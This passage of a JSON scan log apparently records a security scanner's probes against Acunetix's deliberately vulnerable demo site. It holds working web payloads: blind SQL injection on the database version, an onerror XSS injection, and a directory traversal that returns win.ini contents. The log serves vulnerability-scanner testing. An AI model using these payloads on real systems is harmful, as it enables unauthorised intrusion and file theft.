+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%278%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:55 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_digit_8",
+  "t": 1791137097.635
+ },
+ "pr-0024": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:56 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_digit_5",
+  "t": 1791137097.993
+ },
+ "pr-0025": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/Search.asp?tfSearch=%22+onerror%3D%22window.__SENTINEL_XSS__%3D%27l3canary%27%22",
+   "headers": {},
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {},
+   "body": "",
+   "size": 0,
+   "browser": {
+    "fired": false,
+    "flag_value": "",
+    "variant": "attr_inject_onerror",
+    "flag_expected": "l3canary"
+   }
+  },
+  "label": "browser_exec",
+  "t": 1791137098.328
+ },
+ "pr-0026": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:58 GMT",
+    "content-length": "2783"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>Untitled Document</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" --><!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252Fwindows%252Fwin%2Eini\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252Fwindows%252Fwin%2Eini\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n\r\n\t\t<!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 2783,
+   "redirect_chain": []
+  },
+  "label": "file_read",
+  "t": 1791137099.96
+ }
+}
